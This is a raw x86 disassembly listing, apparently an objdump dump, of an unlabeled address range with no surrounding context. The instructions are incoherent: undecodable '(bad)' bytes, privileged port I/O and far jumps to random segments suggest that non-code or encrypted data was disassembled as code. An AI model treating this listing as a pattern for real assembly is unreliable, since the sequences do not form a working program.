  4222cf:	xor    BYTE PTR [eax+edi*1+0x4d],0xcf
  4222d4:	loopne 0x422295
  4222d6:	jecxz  0x42232d
  4222d8:	jle    0x422295
  4222da:	push   cs
  4222db:	mov    esp,0xbef58856
  4222e0:	jg     0x4222c3
  4222e2:	xor    BYTE PTR ds:0x756d60c7,ch
  4222e8:	jae    0x422314
  4222ea:	dec    ebx
  4222eb:	ror    BYTE PTR [ebp+0x2d],1
  4222ee:	test   DWORD PTR [esp+eax*1],0x420fdfc7
  4222f5:	pop    ss
  4222f6:	mov    edi,0xacc31e9a
  4222fb:	sbb    ebx,DWORD PTR [eax-0x17]
  4222fe:	jl     0x422295
  422300:	xchg   esp,eax
  422301:	in     eax,dx
  422302:	das    
  422303:	mov    edx,0x26549c1d
  422308:	inc    ebp
  422309:	mov    cl,0x2d
  42230b:	int3   
  42230c:	xchg   edi,eax
  42230d:	mov    esi,0x1e140b4a
  422312:	adc    edi,DWORD PTR [ebp-0x5d44ac5c]
  422318:	test   al,0xb2
  42231a:	cs pop ds
  42231c:	xlat   BYTE PTR ds:[ebx]
  42231d:	xchg   ecx,eax
  42231e:	loope  0x422370
  422320:	push   cs
  422321:	dec    ebx
  422322:	jno    0x422321
  422324:	add    eax,0xbc87e8ec
  422329:	or     eax,0xee52bd1a
  42232e:	mov    dl,0xab
  422330:	aad    0xb3
  422332:	jmp    0x251e51f5
  422337:	push   DWORD PTR cs:[edi-0x56]
  42233b:	pop    ebx
  42233c:	push   ds
  42233d:	(bad)  [esi]
  42233f:	xchg   al,dh
  422341:	push   ecx
  422342:	mov    eax,0x27521c3d
  422347:	mov    cl,0xd7
  422349:	(bad)  
  42234a:	clc    
  42234b:	or     al,0xa4
  42234d:	aad    0xe8
  42234f:	push   cs
  422350:	xchg   ebx,ebx
  422352:	ds int3 
  422354:	out    0x3,eax
  422356:	push   esp
  422357:	test   ebp,edx
  422359:	test   BYTE PTR [ecx],ah
  42235b:	push   0x44
  42235d:	mov    esi,0xce8c8402
  422362:	mov    BYTE PTR [edi+eiz*4-0x456ad0d5],dh
  422369:	sub    al,0x99
  42236b:	sbb    al,BYTE PTR [esi-0x514e65ee]
  422371:	outs   dx,BYTE PTR cs:[esi]
  422373:	jns    0x4223cd
  422375:	outs   dx,BYTE PTR ds:[esi]
  422376:	test   DWORD PTR [edi+0x4b1b6f92],esi
  42237c:	enter  0x593d,0xf7
  422380:	lahf   
  422381:	sahf   
  422382:	mov    edi,0xd9466277
  422387:	adc    DWORD PTR [edi-0x38b9784e],ecx
  42238d:	xchg   edi,eax
  42238e:	retf   0x3cde
  422391:	sbb    eax,0xa1e0e76d
  422396:	or     dl,al
  422398:	cli    
  422399:	xchg   BYTE PTR [esi-0x2ad96e60],cl
  42239f:	sub    eax,0x73fe0e00
  4223a4:	cdq    
  4223a5:	dec    ebx
  4223a6:	jmp    0x4223f7
  4223a8:	vxorps ymm0,ymm1,ymm5
  4223ac:	(bad)  
  4223ae:	push   0x54a6b6c1
  4223b3:	outs   dx,BYTE PTR ds:[esi]
  4223b4:	push   ecx
  4223b5:	arpl   WORD PTR [esi+0x16a32539],sp
  4223bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223bc:	ret    
  4223bd:	mov    ch,BYTE PTR [ebx-0x60]
  4223c0:	outs   dx,BYTE PTR ds:[esi]
  4223c1:	xchg   ecx,eax
  4223c2:	pop    esp
  4223c3:	mov    esp,0x7583568d
  4223c8:	sub    bl,cl
  4223ca:	mov    ch,0xb8
  4223cc:	mov    eax,0xc3477c88
  4223d1:	sti    
  4223d2:	in     eax,dx
  4223d3:	pop    ss
  4223d4:	in     al,dx
  4223d5:	cmp    bl,BYTE PTR [eax]
  4223d7:	mov    ss,WORD PTR [edi+eiz*1-0x7f]
  4223db:	test   eax,0xcd6dbf39
  4223e0:	mov    ebp,0x3d78c090
  4223e5:	push   es
  4223e6:	pop    ecx
  4223e7:	mov    cl,0xc5
  4223e9:	push   esi
  4223ea:	ins    DWORD PTR es:[edi],dx
  4223eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ec:	rcl    dl,0x81
  4223ef:	xchg   esp,eax
  4223f0:	pop    ss
  4223f1:	mov    dh,0x85
  4223f3:	and    al,0xa1
  4223f5:	sahf   
  4223f6:	rcr    BYTE PTR [esi],0x4b
  4223f9:	mov    edx,0xa06e78ca
  4223fe:	xlat   BYTE PTR ds:[ebx]
  4223ff:	mov    esi,0xaae67645
  422404:	or     eax,0xe60245ff
  422409:	fwait
  42240a:	in     al,dx
  42240b:	pop    esi
  42240c:	int3   
  42240d:	mov    eax,0x3fc98f44
  422412:	mov    ah,0x88
  422414:	mov    cl,0x39
  422416:	push   ebx
  422417:	jle    0x42244c
  422419:	es in  eax,0xce
  42241c:	dec    esp
  42241d:	adc    al,0x6c
  42241f:	in     al,0x6
  422421:	mov    DWORD PTR [eax+0x4f281c8b],esp
  422427:	or     DWORD PTR ss:[esi+eiz*2],0xffffff81
  42242c:	push   ecx
  42242d:	fcomp  st(4)
  42242f:	mov    cl,0x83
  422431:	inc    ecx
  422432:	lea    eax,[ecx]
  422434:	stos   BYTE PTR es:[edi],al
  422435:	fsubr  QWORD PTR ds:0xc3a9faca
  42243b:	(bad)  
  42243c:	(bad)  
  42243d:	out    dx,eax
  42243e:	popa   
  42243f:	call   0x9931:0x2633d580
  422446:	scas   al,BYTE PTR es:[edi]
  422447:	sahf   
  422448:	sbb    eax,0x1e5f5e5d
  42244d:	xchg   esi,eax
  42244e:	adc    ch,dl
  422450:	pop    ebx
  422451:	cmp    eax,0x15466b04
  422456:	mov    eax,ds:0xc80fb46a
  42245b:	ins    DWORD PTR es:[edi],dx
  42245c:	retf   
  42245d:	xchg   edi,eax
  42245e:	das    
  42245f:	pop    eax
  422460:	pop    ebx
  422461:	sub    DWORD PTR [ecx],ebp
  422463:	ins    BYTE PTR es:[edi],dx
  422464:	xor    cl,BYTE PTR [esi+0x20]
  422467:	jmp    0x4224cb
  422469:	jno    0x422447
  42246b:	arpl   ax,bp
  42246d:	xchg   bp,ax
  42246f:	jle    0x42246b
  422471:	adc    DWORD PTR [ebx],ecx
  422473:	retf   0xe4fd
  422476:	pop    ecx
  422477:	rcl    DWORD PTR [ebp+eiz*8-0x26],0x29
  42247c:	(bad)  
  42247d:	jb     0x4224a1
  42247f:	jne    0x422493
  422481:	out    0x39,eax
  422483:	jge    0x4224c0
  422485:	push   edi
  422486:	push   ds
  422487:	jae    0x422471
  422489:	dec    ebx
  42248a:	sbb    eax,0x3abdf074
  42248f:	adc    al,0x48
  422491:	jmp    0x422419
  422493:	hlt    
  422494:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422495:	hlt    
  422496:	mov    dh,0xee
  422498:	fs cmp cl,ah
  42249b:	(bad)  
  42249c:	int    0xed
  42249e:	das    
  42249f:	ficom  WORD PTR [eax]
  4224a1:	push   eax
  4224a2:	lea    ebx,[edi+ebx*1+0x3cf93e36]
  4224a9:	fisub  WORD PTR [ebp+0x44]
  4224ac:	fucomi st,st(5)
  4224ae:	pop    ss
  4224af:	inc    edx
  4224b0:	js     0x422514
  4224b2:	pop    esi
  4224b3:	mov    BYTE PTR [edx],bh
  4224b5:	and    DWORD PTR [eax-0x32],esi
  4224b8:	jno    0x4224fe
  4224ba:	inc    edx
  4224bb:	leave  
  4224bc:	pop    ss
  4224bd:	aaa    
  4224be:	test   DWORD PTR [edx],ecx
  4224c0:	fstp   QWORD PTR [ecx-0x50]
  4224c3:	bound  esp,QWORD PTR [edi]
  4224c5:	mov    edi,0xb15e6928
  4224ca:	loop   0x42245a
  4224cc:	dec    eax
  4224cd:	test   ch,ah
  4224cf:	push   0xf3d8973b
  4224d4:	test   ebx,ebx
  4224d6:	pop    ebx
  4224d7:	out    0x8d,eax
  4224d9:	mov    bh,0xc6
  4224db:	inc    ecx
  4224dc:	jge    0x4224e4
  4224de:	dec    ebp
  4224df:	pop    ds
  4224e0:	add    BYTE PTR [ebx+0x18],0x17
  4224e4:	sahf   
  4224e5:	sub    ebx,edi
  4224e7:	mov    dh,0x27
  4224e9:	adc    edi,edx
  4224eb:	mov    ah,BYTE PTR [esi+0x254d1719]
  4224f1:	xchg   esi,eax
  4224f2:	sbb    ebp,DWORD PTR [ecx-0x24]
  4224f5:	mov    eax,0xc4af68f7
  4224fa:	push   eax
  4224fb:	addr16 mov bh,0x63
  4224fe:	in     al,dx
  4224ff:	sbb    al,0xa5
  422501:	gs clc 
  422503:	repnz dec bl
  422506:	xchg   ecx,eax
  422507:	rol    BYTE PTR [ecx+0x57d13daf],0xdf
  42250e:	cmp    BYTE PTR [ebx+0x15],ah
  422511:	js     0x422538
  422513:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422514:	pop    esp
  422515:	mov    ah,0x43
  422517:	rcl    eax,cl
  422519:	push   ebx
  42251a:	lods   al,BYTE PTR ds:[esi]
  42251b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42251c:	fimul  DWORD PTR [edx-0x13b26989]
  422522:	adc    ch,ch
  422524:	pop    edi
  422525:	xchg   DWORD PTR [ebp-0x4ff0d6e0],eax
  42252b:	adc    al,0x23
  42252d:	outs   dx,BYTE PTR ds:[esi]
  42252e:	vpmaxsw ymm1,ymm3,YMMWORD PTR [esi]
  422532:	mov    ch,0xe3
  422534:	(bad)  
  422535:	sbb    bl,bh
  422537:	xor    eax,0x23ead4a4
  42253c:	pop    eax
  42253d:	clc    
  42253e:	xchg   ebx,eax
  42253f:	xchg   DWORD PTR [ebp-0x5821b8a4],ecx
  422545:	jo     0x422542
  422547:	adc    edi,esi
  422549:	sti    
  42254a:	xlat   BYTE PTR ds:[ebx]
  42254b:	imul   ecx,DWORD PTR [esi+0x23],0xffffff9b
  42254f:	pop    edx
  422550:	mov    esp,0xf3cf443a
  422555:	call   0xdb48:0x27ef5c62
  42255c:	push   eax
  42255d:	xlat   BYTE PTR ds:[ebx]
  42255e:	jl     0x42252a
  422560:	lea    ebp,[esi+edx*8+0x50]
  422564:	push   esp
  422565:	rol    BYTE PTR [esi+edi*1],1
  422568:	into   
  422569:	pop    ds
  42256a:	aaa    
  42256b:	add    al,0xad
  42256d:	repz push ecx
  42256f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422570:	xor    eax,0xeb0daadb
  422575:	sbb    al,0x1d
  422577:	loopne 0x422571
  422579:	and    DWORD PTR [ebx-0x769f990],eax
  42257f:	popa   
  422580:	and    BYTE PTR [esi+0xfccf3ea],al
  422586:	jp     0x422600
  422588:	dec    ebx
  422589:	cmp    eax,0xcf2787a
  42258e:	out    0x4,eax
  422590:	mov    dl,0xa7
  422592:	xchg   edx,eax
  422593:	mov    ebp,DWORD PTR [eax+0x6d7e174d]
  422599:	cmp    dl,cl
  42259b:	inc    esp
  42259c:	adc    eax,0x998e1cd3
  4225a1:	das    
  4225a2:	test   eax,0x375d4f19
  4225a7:	push   edi
  4225a8:	mov    bh,0x88
  4225aa:	lds    ebp,FWORD PTR [ebx-0x3249bce5]
  4225b0:	mov    al,dl
  4225b2:	jp     0x42258b
  4225b4:	inc    edi
  4225b5:	sbb    BYTE PTR [edi-0x73],dh
  4225b8:	popf   
  4225b9:	mov    ah,0x7b
  4225bb:	aad    0xc1
  4225bd:	shr    BYTE PTR [esi+0x56],0xab
  4225c1:	sub    BYTE PTR [edi],bh
  4225c3:	jnp    0x422632
  4225c5:	fwait
  4225c6:	jb     0x422551
  4225c8:	enter  0xa50d,0xa2
  4225cc:	rol    edi,cl
  4225ce:	pushf  
  4225cf:	sbb    BYTE PTR [ecx+0x62],ah
  4225d2:	mov    esi,0x87dabdf6
  4225d7:	xchg   ebp,eax
  4225d8:	stos   BYTE PTR es:[edi],al
  4225d9:	lock sub cl,dl
  4225dc:	cwde   
  4225dd:	std    
  4225de:	mov    BYTE PTR [edi],al
  4225e0:	(bad)  
  4225e1:	loop   0x4225fa
  4225e3:	ret    0xb718
  4225e6:	inc    ebp
  4225e7:	xor    al,0xfa
  4225e9:	adc    al,0x37
  4225eb:	ins    DWORD PTR es:[edi],dx
  4225ec:	pusha  
  4225ed:	mov    ds:0xb5b44258,al
  4225f2:	out    0x7d,eax
  4225f4:	mov    esi,DWORD PTR [edx-0x2a7b20cf]
  4225fa:	scas   eax,DWORD PTR es:[edi]
  4225fb:	inc    esi
  4225fc:	add    dh,BYTE PTR ds:0x487667f
  422602:	pop    ebp
  422603:	stos   DWORD PTR es:[edi],eax
  422604:	jne    0x422655
  422606:	mov    esi,0x83a46c6a
  42260b:	jno    0x422622
  42260d:	out    dx,eax
  42260e:	push   ebp
  42260f:	mov    esi,0x218de1fb
  422614:	(bad)  
  422615:	in     eax,dx
  422616:	in     al,dx
  422617:	xchg   DWORD PTR [esi],ecx
  422619:	pop    es
  42261a:	xor    ah,BYTE PTR [esi+0x79]
  42261d:	lea    edx,[ebx-0x19]
  422620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422621:	adc    BYTE PTR [edx],ah
  422623:	xchg   ebp,eax
  422624:	sbb    eax,ebp
  422626:	in     al,0xce
  422628:	nop
  422629:	(bad)  
  42262a:	mov    edi,0xf0d45c1
  42262f:	add    eax,0x5c28faf6
  422634:	add    eax,0x48035fd5
  422639:	xor    al,0x3a
  42263b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42263c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42263d:	cld    
  42263e:	mov    BYTE PTR [esi+0x447ec8e],dh
  422644:	lock sub dl,BYTE PTR [esi+0x25a62c5f]
  42264b:	add    eax,0xe0896dc0
  422650:	sbb    ebp,DWORD PTR [bx+si]
  422653:	in     eax,0xfd
  422655:	or     eax,0x4f977da6
  42265a:	loopne 0x422617
  42265c:	mov    bh,0x11
  42265e:	or     al,0xc8
  422660:	push   edx
  422661:	stc    
  422662:	add    eax,0x25
  422665:	and    DWORD PTR [edi+0x56],ebp
  422668:	in     al,0x2f
  42266a:	lods   al,BYTE PTR ds:[esi]
  42266b:	dec    ecx
  42266c:	pushf  
  42266d:	or     bl,BYTE PTR [esi]
  42266f:	pop    ds
  422670:	sbb    BYTE PTR [edi-0x732d4844],0xe4
  422677:	cmp    al,0xa9
  422679:	xchg   ecx,eax
  42267a:	mov    eax,0x2be853db
  42267f:	jne    0x42263c
  422681:	in     eax,dx
  422682:	mov    ds:0xecf90acb,eax
  422687:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422688:	fldenv [esi+0x32eb3c91]
  42268e:	or     al,0xbd
  422690:	cmp    edi,DWORD PTR [ecx+0x60]
  422693:	aam    0x1a
  422695:	clc    
  422696:	push   0x69
  422698:	hlt    
  422699:	jb     0x422630
  42269b:	enter  0x2694,0xb9
  42269f:	lock sub BYTE PTR ds:0xa9323bd,bh
  4226a6:	xor    al,0xf8
  4226a8:	scas   eax,DWORD PTR es:[edi]
  4226a9:	leave  
  4226aa:	mov    al,0x68
  4226ac:	jb     0x4226bc
  4226ae:	adc    eax,0x62feb7b3
  4226b3:	sar    edx,0x3b
  4226b6:	xchg   esp,eax
  4226b7:	arpl   WORD PTR [esi+edx*8],di
  4226ba:	das    
  4226bb:	mov    ch,0xe0
  4226bd:	and    esi,esp
  4226bf:	push   esi
  4226c0:	ss jae 0x422728
  4226c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226c4:	xchg   edx,eax
  4226c5:	(bad)  
  4226c6:	mov    ebx,0x157589a2
  4226cb:	hlt    
  4226cc:	push   ebx
  4226cd:	pop    es
  4226ce:	mov    esi,ecx
  4226d0:	clc    
  4226d1:	test   esi,0x7c3aa95
  4226d7:	or     BYTE PTR [ecx-0x43],0xe6
  4226db:	mov    ebx,edi
  4226dd:	cmp    al,0xa9
  4226df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226e0:	addr16 loop 0x4226ae
  4226e3:	in     eax,0x81
  4226e5:	pop    ds
  4226e6:	and    ebx,ebx
  4226e8:	pminsw mm4,mm4
  4226eb:	sub    ch,bh
  4226ed:	push   0x16b9d837
  4226f2:	loop   0x42275a
  4226f4:	test   BYTE PTR [ecx],0xfb
  4226f7:	jnp    0x422696
  4226f9:	mov    esp,0x79d9b99d
  4226fe:	push   es
  4226ff:	mov    esp,0x7c1c8050
  422704:	fwait
  422705:	inc    ebp
  422706:	mov    bl,0x23
  422708:	sub    bl,BYTE PTR [edi+0x75705bc]
  42270e:	je     0x4226b6
  422710:	adc    al,0xbd
  422712:	sbb    al,0xe4
  422714:	shld   DWORD PTR [ebp-0x3abcd178],esi,0xf6
  42271c:	aam    0xec
  42271e:	adc    esp,ebx
  422720:	mov    edx,0xe1e56d12
  422725:	adc    ch,ch
  422727:	cmp    eax,0xd283d75a
  42272c:	in     al,dx
  42272d:	aad    0x11
  42272f:	fidiv  WORD PTR [esi]
  422731:	shr    BYTE PTR [eax-0x37],0x77
  422735:	dec    edx
  422736:	aad    0x7
  422738:	pop    eax
  422739:	pop    ds
  42273a:	or     al,0x36
  42273c:	pop    ebp
  42273d:	ss sahf 
  42273f:	out    dx,eax
  422740:	pop    edx
  422741:	mov    ebx,0x66605b42
  422746:	cmp    BYTE PTR [edx],cl
  422748:	xor    al,BYTE PTR [edx]
  42274a:	fisttp WORD PTR [edx-0x5]
  42274d:	pop    esp
  42274e:	push   cs
  42274f:	stos   DWORD PTR es:[edi],eax
  422750:	push   0xffffffbc
  422752:	in     eax,0xa1
  422754:	aad    0xa7
  422756:	es dec esi
  422758:	jp     0x4227c9
  42275a:	(bad)  
  42275b:	mov    esi,0x7c6152a8
  422760:	jae    0x4226f8
  422762:	mov    ds:0x97e7a0d6,eax
  422767:	mov    fs,WORD PTR [edi-0x74]
  42276a:	sbb    al,0xb4
  42276c:	mov    eax,0x9dbc1c2
  422771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422772:	push   edx
  422773:	xchg   ebx,eax
  422774:	repnz pop edx
  422776:	daa    
  422777:	rcr    BYTE PTR [edi+edx*2+0xb],1
  42277b:	sub    eax,0x756c9bbb
  422780:	stc    
  422781:	test   DWORD PTR [edx+0x5b4d385e],eax
  422787:	fsubr  st,st(6)
  422789:	js     0x42275b
  42278b:	test   DWORD PTR [edi+0x3ad8a41a],esp
  422791:	in     eax,0x4d
  422793:	or     eax,esp
  422795:	dec    esp
  422796:	xor    BYTE PTR ds:0x89a4b8ea,ch
  42279c:	push   esi
  42279d:	jb     0x42279e
  42279f:	cwde   
  4227a0:	mov    al,0xc3
  4227a2:	rcr    DWORD PTR [ebx-0x7cef8762],cl
  4227a8:	retf   0x9681
  4227ab:	clc    
  4227ac:	push   ebx
  4227ad:	mov    edi,0x33a6adb9
  4227b2:	and    dh,BYTE PTR [edx]
  4227b4:	jmp    0x332f9141
  4227b9:	cmp    eax,0x2e0c6c3d
  4227be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227bf:	nop
  4227c0:	dec    ecx
  4227c1:	(bad)
  4227c5:	test   al,0xc3
  4227c7:	pop    ds
  4227c8:	pop    edi
  4227c9:	aas    
  4227ca:	adc    ecx,DWORD PTR [ebp-0x5e]
  4227cd:	inc    ebp
  4227ce:	adc    BYTE PTR [esi],bh
  4227d0:	retf   
  4227d1:	adc    dh,BYTE PTR [edi]
  4227d3:	es fs mov cl,0xd4
  4227d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227d8:	fimul  DWORD PTR [esi+0x5f5fca96]
  4227de:	ins    BYTE PTR es:[edi],dx
  4227df:	int3   
  4227e0:	idiv   DWORD PTR [ecx-0x67b95eb0]
  4227e6:	lea    eax,[ebp*8+0x3c0920f2]
  4227ed:	mov    bh,0x5d
  4227ef:	in     al,dx
  4227f0:	jb     0x42277f
  4227f2:	je     0x42279a
  4227f4:	call   0xa0f:0x4fe2a434
  4227fb:	lock dec esi
  4227fd:	and    al,0x26
  4227ff:	mov    ds:0x9ea61a6f,eax
  422804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422805:	call   0x34e8cebe
  42280a:	test   al,0x7c
  42280c:	lods   eax,DWORD PTR ds:[esi]
  42280d:	xchg   sp,ax
  42280f:	push   ds
  422810:	pop    es
  422811:	xor    DWORD PTR [edx+0x66],0x3e132bba
  422818:	pop    ss
  422819:	xor    esi,DWORD PTR [edx+eiz*4+0x4e]
  42281d:	sbb    eax,0xbce9f745
  422822:	inc    ecx
  422823:	push   es
  422824:	add    ebx,ebx
  422826:	aas    
  422827:	stos   BYTE PTR es:[edi],al
  422828:	ss mov eax,0x39b315d
  42282e:	ins    DWORD PTR es:[edi],dx
  42282f:	xchg   edx,eax
  422830:	xlat   BYTE PTR ds:[ebx]
  422831:	fist   WORD PTR [ebx+edi*2+0x5032696a]
  422838:	les    esi,FWORD PTR [ecx+edi*2+0x2c]
  42283c:	dec    ecx
  42283d:	push   edi
  42283e:	mov    al,0x26
  422840:	add    ch,BYTE PTR [esi+0x4f]
  422843:	(bad)  
  422844:	lss    esp,FWORD PTR [bx+si]
  422848:	retf   0x7b66
  42284b:	jo     0x4227f3
  42284d:	mov    al,0x0
  42284f:	cdq    
  422850:	pop    ds
  422851:	pop    eax
  422852:	fistp  DWORD PTR [ebx]
  422854:	dec    edi
  422855:	add    ch,0xd5
  422858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422859:	(bad)  
  42285a:	cdq    
  42285b:	shr    DWORD PTR [edx+0x3f],1
  42285e:	fild   QWORD PTR [esi+ebx*1-0x72c48760]
  422865:	(bad)
  42286a:	popa   
  42286b:	ror    DWORD PTR [eax+0x6525334c],cl
  422871:	(bad)  
  422872:	and    al,0x64
  422874:	dec    edi
  422875:	xchg   ebp,eax
  422876:	push   ds
  422877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422878:	or     eax,DWORD PTR [eax+0x24a4b33f]
  42287e:	pop    esp
  42287f:	mov    ?,WORD PTR [esp+ebx*4+0x7d82cc0e]
  422886:	xchg   ebx,eax
  422887:	(bad)  
  422888:	mov    cl,0x4b
  42288a:	mov    al,0xb7
  42288c:	mov    fs,WORD PTR [eax+0x53ed2856]
  422892:	fistp  WORD PTR [ebp-0x5de34954]
  422898:	aad    0x2d
  42289a:	mov    cl,0xfe
  42289c:	mov    dh,0x77
  42289e:	and    bh,BYTE PTR [ebx-0xc]
  4228a1:	or     al,0x41
  4228a3:	(bad)  
  4228a4:	and    BYTE PTR [ecx+0x655b64df],ah
  4228aa:	push   edx
  4228ab:	les    eax,FWORD PTR [eax]
  4228ad:	pop    esi
  4228ae:	loopne 0x42286e
  4228b0:	push   0x69
  4228b2:	jns    0x4228b8
  4228b4:	push   ds
  4228b5:	mov    eax,ds:0x545d98
  4228ba:	cmp    al,0x67
  4228bc:	jmp    0x422923
  4228be:	push   esp
  4228bf:	jmp    0x422841
  4228c1:	shl    BYTE PTR [edi],0xa7
  4228c4:	and    eax,DWORD PTR [esp+ecx*1+0x54]
  4228c8:	mov    eax,ds:0x5801fbf4
  4228cd:	in     eax,dx
  4228ce:	sahf   
  4228cf:	jo     0x4228f7
  4228d1:	in     al,0xa8
  4228d3:	cmp    BYTE PTR [edi+eax*1-0x36],bl
  4228d7:	pop    eax
  4228d8:	ret    0x872d
  4228db:	jmp    0x393c3fd0
  4228e0:	nop
  4228e1:	out    0x58,al
  4228e3:	bound  edi,QWORD PTR [edi+ebx*8]
  4228e6:	es cli 
  4228e8:	je     0x4228b0
  4228ea:	call   0xa919:0x5b9f56e3
  4228f1:	sahf   
  4228f2:	std    
  4228f3:	and    eax,0x43eb556a
  4228f8:	adc    edi,edi
  4228fa:	mov    esp,ebp
  4228fc:	fcmovbe st,st(0)
  4228fe:	mov    ch,0x95
  422900:	(bad)  
  422901:	and    bh,BYTE PTR [ecx-0x8194d83]
  422907:	stos   BYTE PTR es:[edi],al
  422908:	lock sub eax,0xe7bddd33
  42290e:	mov    esp,0xfba17935
  422913:	and    eax,0x5abbe441
  422918:	xchg   esp,eax
  422919:	dec    esi
  42291a:	add    BYTE PTR [ecx+0xd6fbbac],bl
  422920:	lods   al,BYTE PTR ds:[esi]
  422921:	push   eax
  422922:	inc    ebp
  422923:	push   DWORD PTR ds:0xf82b2348
  422929:	(bad)  
  42292a:	add    BYTE PTR [ecx],cl
  42292c:	sbb    DWORD PTR [ebp-0x2a233a74],edi
  422932:	test   eax,0xb7486a69
  422937:	pop    ebp
  422938:	inc    edi
  422939:	dec    edi
  42293a:	xchg   edi,eax
  42293b:	dec    ecx
  42293c:	in     al,0x43
  42293e:	add    ch,BYTE PTR [esi-0x26]
  422941:	inc    ebx
  422942:	xor    eax,0x56cf049c
  422947:	imul   ebx,DWORD PTR [esi+0x4e],0x72
  42294b:	inc    ebx
  42294c:	stos   DWORD PTR es:[edi],eax
  42294d:	xchg   esp,eax
  42294e:	jbe    0x4229a2
  422950:	cs jmp 0xa12f:0xe9bf4d5f
  422958:	dec    esi
  422959:	jns    0x42294a
  42295b:	jns    0x422910
  42295d:	inc    ebx
  42295e:	leave  
  42295f:	ds popa 
  422961:	mov    edi,0x4388dc73
  422966:	push   ebx
  422967:	push   0xd98c24e4
  42296c:	or     DWORD PTR [eax+edx*1+0x66],0xc45eaead
  422974:	retf   
  422975:	stos   BYTE PTR es:[edi],al
  422976:	sub    eax,0x82b5b9a9
  42297b:	adc    edi,DWORD PTR [edi]
  42297d:	into   
  42297e:	repz sar edi,1
  422981:	mov    ebx,0x54656fec
  422986:	inc    edx
  422987:	jecxz  0x4229ce
  422989:	and    DWORD PTR ds:0xe4b766e8,ebx
  42298f:	fist   WORD PTR [ebx-0x6]
  422992:	jg     0x42292c
  422994:	mov    edx,0xc9d85168
  422999:	in     eax,dx
  42299a:	arpl   WORD PTR [edi],bx
  42299c:	mov    al,ds:0x2e7980ee
  4229a1:	jnp    0x4229a9
  4229a3:	and    DWORD PTR [esi+ebp*8+0x1f],0xffffffb9
  4229a8:	fst    QWORD PTR [ebx-0x29]
  4229ab:	add    al,0x99
  4229ad:	add    edi,DWORD PTR [ebp-0x365234b9]
  4229b3:	daa    
  4229b4:	inc    esp
  4229b5:	cmp    BYTE PTR [esi-0x4ccb4477],bl
  4229bb:	mov    esp,0xc90ae4e9
  4229c0:	fsin   
  4229c2:	cmp    dh,BYTE PTR [esi+0x67]
  4229c5:	xor    DWORD PTR [ecx+0xd],edx
  4229c8:	sub    dl,BYTE PTR [ebp-0x44]
  4229cb:	jae    0x422960
  4229cd:	cs cmp eax,0xaf61ec8b
  4229d3:	ins    DWORD PTR es:[edi],dx
  4229d4:	icebp  
  4229d5:	mov    ecx,0xf1472e8
  4229da:	iret   
  4229db:	cmp    BYTE PTR [edx],0xce
  4229de:	ds clc 
  4229e0:	shl    DWORD PTR [ebp-0x61a37005],0x93
  4229e7:	les    ebp,FWORD PTR [esi]
  4229e9:	in     al,0xd2
  4229eb:	jbe    0x422a34
  4229ed:	ret    
  4229ee:	jno    0x422977
  4229f0:	(bad)  
  4229f1:	jbe    0x4229b9
  4229f3:	outs   dx,BYTE PTR ds:[esi]
  4229f4:	dec    ebx
  4229f5:	ret    
  4229f6:	mov    bh,BYTE PTR [edi]
  4229f8:	call   0x4785:0xac72ce71
  4229ff:	push   ds
  422a00:	repnz dec ebp
  422a02:	mov    ch,0x49
  422a04:	fxch   st(4)
  422a06:	inc    edx
  422a07:	hlt    
  422a08:	cs fwait
  422a0a:	into   
  422a0b:	popa   
  422a0c:	jg     0x4229da
  422a0e:	les    edx,FWORD PTR [ebx-0x52]
  422a11:	mov    edi,0xda1196ff
  422a16:	fisubr DWORD PTR [edi-0x20998c1d]
  422a1c:	aas    
  422a1d:	sti    
  422a1e:	jnp    0x4229b7
  422a20:	je     0x4229e8
  422a22:	(bad)  
  422a23:	mov    eax,0x3cea5357
  422a28:	(bad)  [edx]
  422a2a:	mov    esi,DWORD PTR [eax-0x8]
  422a2d:	inc    edx
  422a2e:	sbb    ecx,DWORD PTR [edi]
  422a30:	mov    dh,0x2c
  422a32:	fld    QWORD PTR [edx-0x1dcf8a4e]
  422a38:	or     DWORD PTR [eax],ebp
  422a3a:	jecxz  0x422a53
  422a3c:	stos   DWORD PTR es:[edi],eax
  422a3d:	mov    DWORD PTR [edx-0x4ec71c61],edi
  422a43:	xor    DWORD PTR [ebx],esi
  422a45:	mov    gs,ebx
  422a47:	out    dx,al
  422a48:	and    eax,0xedc7390f
  422a4d:	and    cl,BYTE PTR [ecx+edx*2-0x76]
  422a51:	dec    eax
  422a52:	sbb    dh,BYTE PTR [edx+ecx*1-0x32e3a37f]
  422a59:	push   ebp
  422a5a:	pop    edx
  422a5b:	mov    edi,0xa7cfad73
  422a60:	jge    0x422a82
  422a62:	add    BYTE PTR [ecx],0xc8
  422a65:	push   edx
  422a66:	sub    eax,0xf32d992d
  422a6b:	add    al,ah
  422a6d:	cmp    eax,0x8d45bfa1
  422a72:	cdq    
  422a73:	add    ch,0x8c
  422a76:	push   ss
  422a77:	sbb    ch,BYTE PTR [edi-0x3]
  422a7a:	into   
  422a7b:	jle    0x422a15
  422a7d:	sti    
  422a7e:	cs xchg edx,eax
  422a80:	lea    esp,[edi]
  422a82:	jo     0x422aea
  422a84:	sub    edi,DWORD PTR [ebp-0x50]
  422a87:	arpl   di,cx
  422a89:	leave  
  422a8a:	push   ebp
  422a8b:	cmp    BYTE PTR [ebx+ecx*2+0x5ca69a4a],ch
  422a92:	ror    BYTE PTR [ecx-0x64368444],0x92
  422a99:	ret    0x629d
  422a9c:	add    dh,dh
  422a9e:	push   ecx
  422a9f:	arpl   WORD PTR [ecx+0x1adaef76],di
